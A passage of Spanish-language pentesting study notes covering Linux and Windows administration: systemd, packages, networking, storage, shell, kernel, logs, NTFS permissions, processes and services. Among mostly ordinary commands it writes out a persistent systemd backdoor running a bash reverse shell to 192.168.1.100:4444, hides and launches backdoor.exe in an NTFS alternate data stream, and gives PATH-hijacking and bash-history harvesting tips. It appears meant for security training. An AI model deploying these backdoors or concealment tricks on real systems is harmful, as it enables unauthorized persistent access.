#### 2.5.4 [journalctl](../raw/l1n9x-4dm1n.md#journalctl) - Logs del sistema

```bash
journalctl # todos los logs (paginados)
journalctl -u nombre.service # logs de un servicio especifico
journalctl -p err # solo logs de nivel error
journalctl -f # follow (tail -f)
journalctl -n 50 # ultimas 50 lineas
journalctl --since "1 hour ago" # desde hace una hora
journalctl -k # solo mensajes del kernel (dmesg)
journalctl -o json # salida en JSON
journalctl --vacuum-size=500M # reducir tamano del journal a 500MB
journalctl --list-boots # lista de boots
journalctl -b -1 # logs del boot anterior
```

Configuracion en /etc/systemd/journald.conf:
```
[Journal]
Storage=persistent
Compress=yes
SystemMaxUse=1G
```

#### 2.5.5 Timers - Cron de systemd

```
[Unit]
Description=Ejecutar backup diario

[Timer]
OnCalendar=daily
Persistent=true
RandomizedDelaySec=3600

[Install]
WantedBy=timers.target
```

```bash
systemctl list-timers # listar timers y proximas ejecuciones
```

#### 2.5.6 Targets - Equivalentes a runlevels

- poweroff.target - runlevel 0 (apagar).
- rescue.target - runlevel 1 (single-user mode).
- multi-user.target - runlevel 3 (multiusuario sin grafica).
- graphical.target - runlevel 5 (con interfaz grafica).
- reboot.target - runlevel 6 (reinicio).

```bash
systemctl isolate multi-user.target # cambiar a modo multiusuario
systemctl get-default # target por defecto
systemctl set-default multi-user.target # cambiar target por defecto
```

#### 2.5.7 SysV init (para sistemas viejos)

```bash
service apache2 start # iniciar
service apache2 stop # detener
service apache2 restart # reiniciar
service apache2 status # estado
service --status-all # todos los servicios

chkconfig --list # listar servicios en cada runlevel
chkconfig apache2 on # habilitar en runlevels actuales
update-rc.d apache2 enable # en Debian/Ubuntu
```

Los scripts de init estan en /etc/init.d/, y los symlinks de runlevel en /etc/rc?.d/.

#### 2.5.8 Servicios comunes y puertos

```bash
systemctl list-units --type=service | grep running
ss -tlnp # sockets TCP escuchando
ss -ulnp # sockets UDP
```

- sshd (22) - acceso remoto.
- httpd/nginx/apache2 (80, 443) - servidor web.
- mysqld/mariadb (3306) - base de datos.
- postgresql (5432) - base de datos.
- vsftpd/proftpd (21) - FTP.
- smbd (445, 139) - Samba/CIFS.
- named (53) - DNS.
- [docker](../raw/d0ck3r-f0r-h4ck3rs.md) - contenedores.

#### 2.5.9 [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) y puertas traseras

Crear un servicio que arranque siempre con el sistema:

```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now backdoor.service
```

---### 2.6 Gestion de Paquetes

#### 2.6.1 dpkg - Base de Debian/Ubuntu

```bash
dpkg -i paquete.deb # instalar
dpkg -r paquete # desinstalar (deja config)
dpkg -P paquete # purgar (todo)
dpkg -l # listar instalados
dpkg -s paquete # estado de un paquete
dpkg -L paquete # archivos que instalo
dpkg -S /path/to/file # que paquete es duenio de un archivo
dpkg --configure -a # reconfigurar paquetes pendientes
```

Base de datos: /var/lib/dpkg/status.

#### 2.6.2 APT - Advanced Package Tool

```bash
apt update # actualizar lista de paquetes
apt upgrade # actualizar paquetes instalados
apt full-upgrade # upgrade con resolucion de dependencias
apt install paquete # instalar
apt remove paquete # desinstalar
apt purge paquete # purgar
apt autoremove # limpiar dependencias no usadas
apt search palabra # buscar paquetes
apt show paquete # informacion detallada
apt list --installed # listar instalados
apt edit-sources # editar sources.list
apt-cache policy paquete # repositorios y versiones
```

Archivos de configuracion:
- /etc/apt/sources.list
- /etc/apt/sources.list.d/

#### 2.6.3 RPM - Red Hat Package Manager

```bash
rpm -ivh paquete.rpm # instalar
rpm -e paquete # borrar
rpm -qa # listar todos instalados
rpm -qi paquete # informacion
rpm -ql paquete # archivos del paquete
rpm -qf /path/to/file # que paquete es duenio
rpm -V paquete # verificar integridad
rpm -Va # verificar todos los paquetes
```

#### 2.6.4 YUM/DNF - Fedora/CentOS/RHEL

```bash
# DNF
dnf install paquete
dnf remove paquete
dnf update # actualizar todo
dnf search keyword
dnf info paquete
dnf list installed
dnf provides /path/to/file # que paquete da ese archivo
dnf groupinstall "Development Tools"
dnf history

# YUM (similar)
yum install paquete
yum deplist paquete # dependencias
```

Repositorios: /etc/yum.repos.d/

#### 2.6.5 Pacman - Arch Linux

```bash
pacman -S paquete # instalar
pacman -Rns paquete # desinstalar con dependencias y config
pacman -Syu # actualizar todo
pacman -Ss keyword # buscar
pacman -Qi paquete # informacion
pacman -Ql paquete # archivos del paquete
pacman -Qo /path/to/file # que paquete es duenio
pacman -Qdt # paquetes huerfanos
```

#### 2.6.6 Compilar desde fuente

```bash
# Autotools
./configure --prefix=/usr/local
make
make install

# CMake
mkdir build && cd build
cmake .
make
make install

# Checkear dependencias
ldd /usr/local/bin/programa
ldd /usr/local/bin/programa | grep "not found"
```

#### 2.6.7 Verificacion de integridad

```bash
# Debian/Ubuntu - debsums
debsums paquete # verificar checksums de archivos instalados
debsums -c # todos los paquetes, archivos modificados

# RPM
rpm -Va # verificar todos
```

Esto es clave para detectar rootkits o modificaciones no autorizadas.

---### 2.7 Configuracion de Red

#### 2.7.1 Interfaces de red

```bash
ip link # interfaces de red
ip link set eth0 up # activar interfaz
ip link set eth0 down # desactivar

ip addr # direcciones IP
ip addr show eth0 # IP de una interfaz
ip addr add 192.168.1.100/24 dev eth0 # asignar IP
ip addr del 192.168.1.100/24 dev eth0 # quitar IP

ip route # tabla de enrutamiento
ip route add default via 192.168.1.1 # ruta por defecto
ip route add 10.0.0.0/8 via 192.168.1.254

ip neigh # tabla ARP
ip neigh add 192.168.1.5 lladdr aa:bb:cc:dd:ee:ff dev eth0
ip neigh del 192.168.1.5 dev eth0
```

#### 2.7.2 ifconfig (obsoleto pero comun)

```bash
ifconfig # interfaces activas
ifconfig -a # todas (incluso down)
ifconfig eth0 192.168.1.100 netmask 255.255.255.0 up
```

#### 2.7.3 ss y netstat

```bash
ss -tlnp # TCP escuchando con proceso
ss -tulpn # todos los puertos escuchando
ss -tup # conexiones establecidas
ss -s # estadisticas de sockets

netstat -tulpn # similar (obsoleto)
netstat -anp | grep LISTEN
netstat -rn # tabla de enrutamiento
```

#### 2.7.4 Resolucion de nombres

```bash
cat /etc/hosts # resolucion local
cat /etc/resolv.conf # servidores DNS

host dominio.com # resolucion DNS
nslookup dominio.com # consulta DNS interactiva
dig dominio.com # consulta DNS detallada
dig -x 8.8.8.8 # resolucion inversa
```

#### 2.7.5 nmcli - NetworkManager

```bash
nmcli dev status # estado de dispositivos de red
nmcli dev wifi list # redes WiFi disponibles
nmcli dev wifi connect SSID password contraseña
nmcli con show # conexiones configuradas
nmcli con add con-name "estatica" ifname eth0 type ethernet ip4 192.168.1.100/24 gw4 192.168.1.1
nmcli con up "estatica" # activar conexion
```

#### 2.7.6 Archivos de configuracion de red

**Debian/Ubuntu (/etc/network/interfaces):**
```
auto eth0
iface eth0 inet static address 192.168.1.100 netmask 255.255.255.0 gateway 192.168.1.1 dns-nameservers 8.8.8.8
```

**CentOS/RHEL (/etc/sysconfig/network-scripts/ifcfg-eth0):**
```
DEVICE=eth0
BOOTPROTO=static
IPADDR=192.168.1.100
NETMASK=255.255.255.0
GATEWAY=192.168.1.1
ONBOOT=yes
```

**Netplan (Ubuntu moderno - /etc/netplan/01-netcfg.yaml):**
```yaml
network: version: 2 ethernets: eth0: addresses: - 192.168.1.100/24 gateway4: 192.168.1.1 nameservers: addresses: [8.8.8.8, 1.1.1.1]
```

```bash
netplan apply # aplicar configuracion
```

#### 2.7.7 Tuneles

```bash
# Tunel SSH
ssh -L 8080:localhost:80 usuario@servidor # forward local
ssh -R 8080:localhost:80 usuario@servidor # forward remoto
ssh -D 1080 usuario@servidor # SOCKS proxy
```

#### 2.7.8 Enumeracion de red para pentesting

```bash
ip a # todo lo que hay
ip route # rutas
cat /etc/hosts # hosts locales
cat /etc/resolv.conf # DNS
arp -a # tabla ARP
ss -tulpn # servicios escuchando
iptables -L -n -v # reglas de firewall
```

---### 2.8 Almacenamiento y Discos

#### 2.8.1 Dispositivos de bloque

```bash
lsblk # dispositivos de bloque
lsblk -f # con sistemas de archivos
blkid # UUID y etiquetas de dispositivos
blkid /dev/sda1 # de un dispositivo especifico

fdisk -l # tabla de particiones (requiere root)
fdisk /dev/sda # interactivo (root)

parted -l # informacion de particiones
parted /dev/sda print # detalle
```

#### 2.8.2 mount y umount

```bash
mount # sistemas montados actualmente
mount | grep "^/" # solo monturas reales

mount /dev/sdb1 /mnt/disco # montar particion
mount -t ext4 /dev/sdc1 /mnt/data # especificando tipo
mount -o loop archivo.iso /mnt/iso # montar imagen ISO
mount -o remount,rw / # remontar raiz como read-write

umount /mnt/disco # desmontar
umount -l /mnt/disco # lazy unmount

mount -o bind /var/www /mnt/backup # bind mount
```

#### 2.8.3 /etc/fstab - Tabla de sistemas de archivos

```
UUID=abc-123 / ext4 defaults 0 1
UUID=def-456 /home ext4 defaults 0 2
UUID=jkl-012 none swap sw 0 0
/dev/sdb1 /mnt/data ext4 noexec,nodev 0 2
```

Opciones comunes:
- defaults: rw, suid, dev, exec, auto, nouser, async.
- noexec: no ejecutar binarios desde ahi.
- nosuid: ignorar bits SUID/SGID.
- nodev: no permitir archivos de dispositivo.
- ro: solo lectura.

#### 2.8.4 df y du - Espacio en disco

```bash
df -h # espacio en disco (human-readable)
df -hT # incluye tipo de filesystem
df -i # uso de inodos

du -sh directorio # tamano total de directorio
du -sh * | sort -rh # archivos y carpetas ordenados por tamano
du -h --max-depth=1 /var # profundidad maxima
```

#### 2.8.5 LVM - Logical Volume Manager

```bash
# PV - Physical Volumes
pvcreate /dev/sdb1 /dev/sdc1 # marcar discos como PV
pvs # listar PVs

# VG - Volume Groups
vgcreate vg_datos /dev/sdb1 /dev/sdc1  # crear grupo de volumenes
vgs # listar VGs
vgextend vg_datos /dev/sdd1 # agregar disco al VG

# LV - Logical Volumes
lvcreate -L 50G -n lv_root vg_datos  # crear LV de 50GB
lvs # listar LVs

# Redimensionar
lvextend -L +10G /dev/vg_datos/lv_root # extender 10GB
resize2fs /dev/vg_datos/lv_root # redimensionar filesystem

# Snapshots
lvcreate -L 1G -s -n lv_root_snap /dev/vg_datos/lv_root  # snapshot
lvremove /dev/vg_datos/lv_root_snap # borrar snapshot
```

Ventajas de LVM: volumenes mas grandes, redimension en caliente, snapshots.

#### 2.8.6 RAID

```bash
cat /proc/mdstat # estado de arrays MD
mdadm --detail /dev/md0 # detalle de un array

# RAID 0 (striping)
mdadm --create /dev/md0 --level=0 --raid-devices=2 /dev/sdb /dev/sdc

# RAID 1 (mirror)
mdadm --create /dev/md1 --level=1 --raid-devices=2 /dev/sdd /dev/sde

# RAID 5 (paridad)
mdadm --create /dev/md2 --level=5 --raid-devices=3 /dev/sdf /dev/sdg /dev/sdh
```

#### 2.8.7 Loop devices

```bash
losetup -f # encontrar primer loop libre
losetup /dev/loop0 imagen.img # asociar
losetup -a # listar
losetup -d /dev/loop0 # desasociar

mount -o loop imagen.iso /mnt/iso

# Crear imagen de disco
dd if=/dev/zero of=disco.img bs=1M count=100
mkfs.ext4 disco.img
mount -o loop disco.img /mnt/disco
```

#### 2.8.8 dd - Copia a bajo nivel

```bash
dd if=/dev/sda of=disco_backup.img bs=4M status=progress # backup de disco
dd if=/dev/urandom of=/dev/sda bs=4M status=progress # wipear disco

# Pentesting: MBR
dd if=/dev/sda of=mbr.dd bs=512 count=1
```

---### 2.9 Shell y Entorno

#### 2.9.1 Archivos de inicio del shell

**Login shell** (TTY, SSH, su -, sudo -i):
1. /etc/profile - global.
2. ~/.bash_profile - primero busca este.
3. ~/.bash_login - si no existe el anterior.
4. ~/.profile - si no existe ninguno.

**Non-login shell** (terminal grafica):
1. /etc/bash.bashrc - global.
2. ~/.bashrc - personal.

**Logout:**
1. ~/.bash_logout

#### 2.9.2 Variables de entorno

```bash
echo $PATH # directorios de busqueda de ejecutables
echo $HOME # home del usuario
echo $USER # nombre de usuario
echo $SHELL # shell actual
echo $PWD # directorio actual
echo $HOSTNAME # nombre del host
echo $LANG # locale

# Todas las variables
env # entorno completo
printenv # lo mismo

# Exportar variables
export MI_VARIABLE="valor"
export PATH=$PATH:/nuevo/directorio
```

#### 2.9.3 PATH

El PATH es una lista de directorios separados por : donde el shell busca ejecutables.

```bash
which comando # donde esta el ejecutable
type comando # como interpreta el shell el comando
command -v comando # ruta del comando
```

Para un pentester:
- Verificar echo $PATH - si algun directorio es world-writable, podes poner un binario falso.
- Si un script de root usa PATH inseguro, podes hacer hijacking.

#### 2.9.4 History

```bash
history # historial completo
history 10 # ultimos 10 comandos
!! # repetir ultimo comando
!100 # repetir comando #100 del historial
Ctrl+R # busqueda inversa en historial
history -c # limpiar historial
```

Para un pentester, el historial de Bash es oro puro:
```bash
cat ~/*/.bash_history 2>/dev/null | sort -u
```

#### 2.9.5 Alias

```bash
alias # listar todos
alias ll='ls -alF' # crear
unalias ll # borrar
```

#### 2.9.6 Redirecciones y pipes

```bash
comando > archivo # stdout a archivo (sobrescribe)
comando >> archivo # stdout a archivo (agrega)
comando 2> error.log # stderr a archivo
comando &> todo.log # stdout y stderr
comando > /dev/null # descartar stdout
comando 2>&1 | tee archivo # stdout a archivo y terminal
comando < archivo # stdin desde archivo
comando1 | comando2 # pipe
```

### 2.10 Supervision de Procesos

#### 2.10.1 nohup

```bash
nohup comando &
nohup comando > salida.log 2>&1 &
```

#### 2.10.2 disown

```bash
comando &
disown # desliga el ultimo job
disown -h %1 # no le mandes SIGHUP cuando salga
```

#### 2.10.3 screen

```bash
screen -S nombre # crear sesion con nombre
screen -dmS nombre comando # crear en detached mode
screen -ls # listar sesiones
screen -r nombre # reanudar sesion
screen -x nombre # compartir sesion

# Dentro de screen:
Ctrl+A d # detached (despegarse, la sesion sigue)
Ctrl+A c # crear nueva ventana
Ctrl+A n / p # siguiente / anterior ventana
Ctrl+A k # matar ventana actual
```

#### 2.10.4 tmux

```bash
tmux new -s nombre # nueva sesion
tmux new -s nombre -d comando # ejecutar comando en sesion detached
tmux ls # listar sesiones
tmux attach -t nombre # reanudar

# Dentro de tmux:
Ctrl+B d # detached
Ctrl+B c # nueva ventana
Ctrl+B , # renombrar ventana
Ctrl+B n / p # siguiente / anterior
Ctrl+B % # split vertical
Ctrl+B " # split horizontal
Ctrl+B # modo scroll
```

#### 2.10.5 cgroups - Control Groups

```bash
systemd-cgls # arbol de cgroups
systemd-cgtop # top de cgroups
cat /proc/PID/cgroup

# Usar systemd-run para limitar
systemd-run --user --scope -p MemoryMax=100M -p CPUQuota=50% comando
```

#### 2.10.6 namespaces - Aislamiento

Tipos:
- pid: procesos (un proceso solo ve procesos en su namespace).
- net: red (interfaces, rutas, [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) propias).
- mnt: puntos de montaje.
- uts: hostname y domainname.
- user: UIDs y GIDs.

```bash
# Ver namespaces de un proceso
ls -la /proc/PID/ns/

# Ejecutar en un namespace
unshare --fork --pid --mount-proc bash # nuevo PID + mount namespace
unshare --net bash # nuevo network namespace
```

Para un pentester: los namespaces permiten escapar de contenedores si hay configuraciones inseguras.

---### 2.11 Kernel y Modulos

#### 2.11.1 Informacion del kernel

```bash
uname -a # toda la info
uname -r # version del kernel
uname -m # arquitectura (x86_64, aarch64, etc.)
cat /proc/version # version del kernel con compilador
cat /proc/cmdline # parametros de arranque
```

Saber la version exacta del kernel es clave: permite buscar exploits (dirty pipe, dirty cow, etc.).

#### 2.11.2 Modulos del kernel

```bash
lsmod # modulos cargados actualmente
modinfo nombre_del_modulo # informacion del modulo
modprobe nombre_del_modulo # cargar modulo con dependencias
modprobe -r nombre_del_modulo # descargar modulo
insmod /path/to/modulo.ko # cargar modulo (sin resolver dependencias)
rmmod nombre_del_modulo # descargar modulo
```

Un rootkit puede cargarse como modulo del kernel. Esconde procesos, archivos, conexiones:

```bash
# Concepto: insmod rootkit.ko
# El rootkit hookea syscalls para esconderse:
# - Esconde su propio modulo de lsmod
# - Esconde procesos de /proc y ps
# - Esconde archivos de ls
# - Esconde puertos de netstat/ss
```

#### 2.11.3 dmesg - Kernel ring buffer

```bash
dmesg # todo el buffer
dmesg -w # seguir en tiempo real
dmesg -l err # solo errores
dmesg -T # timestamps legibles
```

#### 2.11.4 sysctl - Parametros del kernel

```bash
sysctl -a # todos los parametros
sysctl net.ipv4.ip_forward # IP forwarding
sysctl -w net.ipv4.ip_forward=1 # cambiar parametro (hasta reboot)
sysctl -p # cargar desde /etc/sysctl.conf
```

Parametros importantes para pentesting/seguridad:

```bash
net.ipv4.ip_forward=1 # permitir forwarding (para MITM)
net.ipv4.tcp_syncookies=1 # proteccion contra SYN flood
net.ipv4.conf.all.accept_redirects=0 # ignorar redirects ICMP
kernel.randomize_va_space=2 # ASLR (0=off, 1=partial, 2=full)
kernel.dmesg_restrict=1 # restringir dmesg a root
```

#### 2.11.5 Kernel vulnerabilities historicas

- Dirty COW ([[cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2016-5195): race condition en copy-on-write, escalada local.
- Dirty Pipe (CVE-2022-0847): overwrite archivos arbitrarios. Kernels 5.8+.
- CVE-2021-4034 (pwnkit): en pkexec, escalada a root.
- CVE-2023-3269 (StackRot): [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) en manejo de stacks.
- CVE-2024-1086: use-after-free in netfilter, escalada local.

### 2.12 Logging del Sistema

#### 2.12.1 rsyslog

El logging tradicional. Los logs se escriben en /var/log/.

Archivos de log principales:

| Archivo | Proposito |
|---------|-----------|
| /var/log/syslog | Log general del sistema (Debian/Ubuntu) |
| /var/log/messages | Log general (RHEL/CentOS) |
| /var/log/auth.log | [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) (Debian/Ubuntu) |
| /var/log/secure | Autenticacion (RHEL/CentOS) |
| /var/log/kern.log | Mensajes del kernel |
| /var/log/dmesg | Kernel ring buffer |
| /var/log/boot.log | Mensajes de arranque |
| /var/log/maillog | Correo |
| /var/log/cron | Cron tasks |
| /var/log/btmp | Logins fallidos |
| /var/log/wtmp | Logins exitosos |
| /var/log/lastlog | Ultimo login de cada usuario |
| /var/log/apache2/ | Apache access/error logs |
| /var/log/nginx/ | Nginx access/error logs |

```bash
# Monitorear logs en tiempo real
tail -f /var/log/auth.log

# Buscar intentos de login
grep "Failed password" /var/log/auth.log
grep "Accepted password" /var/log/auth.log
grep "sudo" /var/log/auth.log

# Ultimos logins
last
lastb # failed logins
```

#### 2.12.2 Logrotate

Evita que los logs llenen el disco:

```
/var/log/syslog
{ rotate 7 daily missingok notifempty delaycompress compress postrotate /usr/lib/rsyslog/rsyslog-rotate endscript
}
```

#### 2.12.3 Logs y [forense](../raw/w1n-f0r3ns1cs.md#forense)

Para un pentester/forense, los logs son la linea de tiempo del ataque:

1. Cuando entro? - auth.log / secure.
2. Que hizo? - .bash_history, sudo logs, auditd.
3. Que toco? - access.log de web server.
4. Dejo algo? - cron logs, systemd logs de servicios instalados.

```bash
# Timeline de autenticaciones
zgrep -h "Failed|Accepted" /var/log/auth.log* | awk '{print $1, $2, $3, $9, $11, $13}'
```

---## 3. Windows - Fundamentos

### 3.1 Sistema de Archivos

#### 3.1.1 NTFS vs FAT32 vs exFAT

**FAT32 (File Allocation Table 32):**
- Limite de archivo: 4GB individual.
- Limite de particion: 2TB.
- Sin permisos nativos, sin journaling.
- Compatible con todo (Linux, Mac, Windows, consolas, dispositivos USB).

**exFAT:**
- Limite de archivo: 16 exabytes (teorico).
- Sin journaling.
- Soporte multiplataforma mejorado.
- Pensado para USB externos y SD cards grandes.

**NTFS (New Technology File System):**
- Limite de archivo: 16 exabytes (teorico).
- Limite de particion: 256TB.
- Journaling (registro de cambios antes de escribirlos).
- Permisos de archivo granulares (ACL).
- Compresion y [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) nativo (EFS, BitLocker).
- Alternate Data Streams (ADS).
- Hard links, symbolic links, junctions.
- Quotas de disco por usuario.
- Sparse files.
- Usado en Windows desde NT 3.1.

#### 3.1.2 Letras de unidad y puntos de montaje

Windows asigna letras a los volumenes: C:, D:, etc. Pero tambien puede montar volumenes en carpetas:

```cmd
# Montar volumen en carpeta
mountvol E:\ /P # quitar letra de unidad
mountvol C:\Backup\Datos \\?\Volume{GUID}\  # montar volumen en carpeta
```

#### 3.1.3 Junctions y Symbolic Links

**Junctions (reparse points):** enlazan un directorio a otro.

```cmd
mklink /J C:\Link C:\RealDir
```

**Symbolic Links:** pueden apuntar a archivos o directorios, incluso en red.

```cmd
mklink /D C:\Link C:\RealDir # symlink de directorio
mklink C:\Link.txt C:\Real.txt # symlink de archivo
mklink /H C:\HardLink.txt C:\Real.txt  # hard link (NTFS)
```

**Hard Links:** multiples entradas de directorio que apuntan al mismo archivo en disco.

Los symlink en Windows requieren permisos de administrador (desde Vista). Los junctions no.

#### 3.1.4 Alternate Data Streams (ADS)

Una caracteristica unica de NTFS. Un archivo puede tener multiples "streams" de datos.

```cmd
# Crear ADS
echo "dato oculto" > archivo.txt:stream1.txt

# Leer ADS
more < archivo.txt:stream1.txt

# Ver ADS
dir /R
```

ADS es una tecnica clasica de malware para ocultar datos:

```cmd
type backdoor.exe > legitimo.txt:backdoor.exe
start .\legitimo.txt:backdoor.exe
```

Para detectar ADS en [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell):

```powershell
Get-Item -Path * -Stream *
Get-Content -Path archivo.txt -Stream stream1
Remove-Item -Path archivo.txt -Stream stream1
```

#### 3.1.5 Estructura de directorios del sistema

- C:\Windows\ - el [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos). - System32\ - archivos esenciales del SO, DLLs, drivers, ejecutables. - SysWOW64\ - versiones de 32 bits en sistemas 64 bits. - System32\config\ - archivos del registro (SAM, SECURITY, SOFTWARE, SYSTEM). - System32\drivers\ - drivers del kernel. - System32\Tasks\ - tareas programadas. - Temp\ - archivos temporales del sistema. - [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch)\ - archivos de [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch) (datos de carga de programas).
- C:\Program Files\ - aplicaciones de 64 bits.
- C:\Program Files ([x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86))\ - aplicaciones de 32 bits.
- C:\ProgramData\ - datos de aplicacion compartidos (oculto).
- C:\Users\ - perfiles de usuario. - C:\Users\Public\ - carpetas publicas. - C:\Users\[Usuario]\AppData\Local\ - datos locales. - C:\Users\[Usuario]\AppData\Roaming\ - datos roaming. - C:\Users\[Usuario]\AppData\LocalLow\ - datos de baja integridad.
- C:\Recovery\ - entorno de recuperacion (WinRE).

#### 3.1.6 Archivos forenses clave en Windows

- C:\Windows\System32\config\SAM - hashes de contrasenias locales.
- C:\Windows\System32\config\SECURITY - politica de seguridad.
- C:\Windows\System32\config\SOFTWARE - configuracion del software.
- C:\Windows\System32\config\SYSTEM - configuracion del sistema.
- C:\Windows\System32\drivers\etc\hosts - analogo a /etc/hosts.
- C:\Windows\System32\Tasks\ - tareas programadas en XML.
- C:\Windows\Prefetch\ - archivos .pf con datos de ejecuciones.
- C:\Windows\System32\winevt\Logs\ - archivos .[evtx](../raw/w1n-f0r3ns1cs.md#event-logs) de logs de eventos.
- C:\Users\[Usuario]\NTUSER.DAT - registro del usuario (HKCU montado).

---### 3.2 Permisos NTFS

#### 3.2.1 Permisos basicos NTFS

- **Full Control:** lectura, escritura, ejecucion, modificar permisos, tomar ownership.
- **Modify:** leer, escribir, ejecutar, borrar.
- **Read & Execute:** leer y ejecutar.
- **List Folder Contents:** listar (solo directorios).
- **Read:** leer contenido.
- **Write:** escribir y crear archivos/carpetas.

Permisos atomicos:
- Read Data / List Directory
- Write Data / Create Files
- Append Data / Create Folders
- Traverse Folder / Execute File
- Delete
- Read Permissions
- Change Permissions
- Take Ownership

#### 3.2.2 Permisos de recurso compartido (Share)

Los shares tienen su propio conjunto de permisos:
- Full Control
- Change
- Read

El permiso efectivo al acceder por red es la combinacion mas restrictiva entre Share y NTFS.

Ejemplo:
- Share: Everyone = Full Control
- NTFS: Usuario = Read
- Efectivo: Read

#### 3.2.3 Herencia de permisos

```cmd
icacls C:\Carpeta /inheritance: e # habilitar herencia
icacls C:\Carpeta /inheritance: d # deshabilitar herencia (copiar permisos actuales)
icacls C:\Carpeta /inheritance: r # deshabilitar herencia (remover heredados)
```

#### 3.2.4 icacls - Gestion de permisos desde linea

```cmd
icacls archivo.txt # ver permisos
icacls archivo.txt /grant Usuario:(F) # Full Control
icacls archivo.txt /grant Usuario:(RX) # Read & Execute
icacls archivo.txt /grant Usuario:(M) # Modify
icacls archivo.txt /grant Usuario:(W) # Write
icacls archivo.txt /deny Usuario:(W) # Deny explicito
icacls archivo.txt /remove Usuario # remover entradas
icacls archivo.txt /setowner Administrador # cambiar duenio
icacls archivo.txt /grant Administrador:(F) /T # recursivo
```

Permisos comunes en icacls:
- F - Full control
- M - Modify
- RX - Read & Execute
- R - Read-only
- W - Write-only
- D - Delete
- (OI) - Object Inherit (archivos heredan)
- (CI) - [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Inherit (carpetas heredan)
- (IO) - Inherit Only

#### 3.2.5 takeown - Tomar ownership

```cmd
takeown /f archivo.txt # tomar como Administrador
takeown /f C:\Carpeta /r # recursivo
```

#### 3.2.6 cacls (obsoleto pero presente)

```cmd
cacls archivo.txt # ver permisos
cacls archivo.txt /G Usuario:F # grant Full
cacls archivo.txt /P Usuario:R # set permiso (replace)
cacls archivo.txt /E /G Usuario:F # edit (agregar)
```

#### 3.2.7 Effective Access

1. Si hay Deny explicito, aplica (y anula cualquier Allow).
2. Si no, se suman los Allow.
3. Se toma el mas restrictivo entre Share y NTFS.

```powershell
(Get-Acl -Path C:\Carpeta).Access | Where-Object {$_.IdentityReference -match "Usuario"}
```

#### 3.2.8 Escalacion por permisos debiles

```cmd
icacls C:\ /findsid Usuario /t # busca recursivo
```

### 3.3 Procesos

#### 3.3.1 tasklist y taskkill

```cmd
tasklist # listar procesos
tasklist /FI "IMAGENAME eq notepad.exe" # filtrar por nombre
tasklist /S servidor /U usuario /P contrasenia # remoto
tasklist /V # verbose
tasklist /M # con modulos/DLLs cargados
tasklist /SVC # servicios hospedados (svchost)
tasklist /FO CSV # formato CSV

taskkill /PID 1234 # matar por PID
taskkill /IM notepad.exe # matar por nombre de imagen
taskkill /F /PID 1234 # forzar
taskkill /T /PID 1234 # matar arbol de procesos
```

#### 3.3.2 PowerShell - Get-Process y Stop-Process

```powershell
Get-Process # todos los procesos
Get-Process -Name notepad # por nombre
Get-Process -Id 1234 # por PID
Get-Process | Sort-Object CPU -Descending | Select -First 10 # top 10 por CPU
Get-Process | Where-Object {$_.WorkingSet -gt 100MB}  # memoria > 100MB

Get-Process -Id 1234 | Format-List * # todas las propiedades

Stop-Process -Id 1234
Stop-Process -Name notepad -Force

Start-Process notepad
Start-Process -FilePath "powershell.exe" -Verb RunAs  # como administrador
```

#### 3.3.3 Process Explorer (Sysinternals)

Herramienta grafica indispensable:
- Muestra arbol de procesos (que proceso creo a que otro).
- Muestra handles abiertos (archivos, registros, etc.).
- Muestra DLLs cargadas.
- Permite ver strings dentro de un proceso.
- Permite suspender/reanudar procesos.
- Muestra procesos coloreados.

#### 3.3.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) - Procesos

```cmd
wmic process list brief # lista corta
wmic process list full # lista completa
wmic process where "name='notepad.exe'" get processid,commandline
wmic process call create "calc.exe" # crear proceso
wmic process where "processid='1234'" call terminate  # matar proceso
```

PowerShell con WMI:

```powershell
Get-WmiObject Win32_Process | Select Name, ProcessId, CommandLine
```

#### 3.3.5 Procesos esenciales de Windows

| Proceso | Descripcion | Por que importa |
|---------|-------------|-----------------|
| System (PID 4) | Proceso del kernel | Alto PID, sin ejecutable en disco |
| smss.exe | Session Manager | Primero proceso en user mode |
| csrss.exe | Client Server Runtime Process | Maneja consola, shutdown |
| wininit.exe | Inicializacion de Windows | Corre servicios |
| services.exe | Service Control Manager (SCM) | Padre de todos los servicios |
| lsass.exe | Local Security Authority | Autenticacion, SAM, hashes |
| svchost.exe | Service Host | Host generico para servicios DLL |
| explorer.exe | Windows Explorer | Shell grafico, escritorio |
| winlogon.exe | Winlogon | Maneja logins interactivos |
| spoolsv.exe | Print Spooler | Cola de impresion. Historicamente vulnerable |

#### 3.3.6 svchost.exe en detalle

Un solo svchost.exe aloja multiples servicios:

```cmd
tasklist /SVC # ver que servicios corre cada svchost
```

En el registro:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
```

Cada grupo de servicios tiene parametros (netsvcs, LocalService, NetworkService, etc.).

---### 3.4 Servicios

#### 3.4.1 Service Control Manager (SCM) y sc.exe

El SCM (services.exe) es el proceso padre de todos los servicios Windows.

```cmd
sc query # listar servicios (activos)
sc query state= all # todos los servicios
sc query "wuauserv" # estado de un servicio especifico
sc qc "wuauserv" # configuracion del servicio
sc queryex "wuauserv" # informacion extendida (PID, flags)

sc start "servicio" # iniciar
sc stop "servicio" # detener
sc pause "servicio" # pausar
sc continue "servicio" # reanudar

sc config "servicio" start= auto # habilitar auto-start
sc config "servicio" start= disabled  # deshabilitar
sc config "servicio" start= demand # manual
sc config "servicio" binPath= "C:\nuevo.exe"  # cambiar ejecutable

sc failure "servicio" reset= 86400 actions= restart/5000/restart/10000/reboot/60000

sc delete "servicio" # borrar servicio
sc create "MiServicio" binPath= "C:\tools\servicio.exe" start= auto
```

#### 3.4.2 net start/net stop

```cmd
net start # listar servicios activos
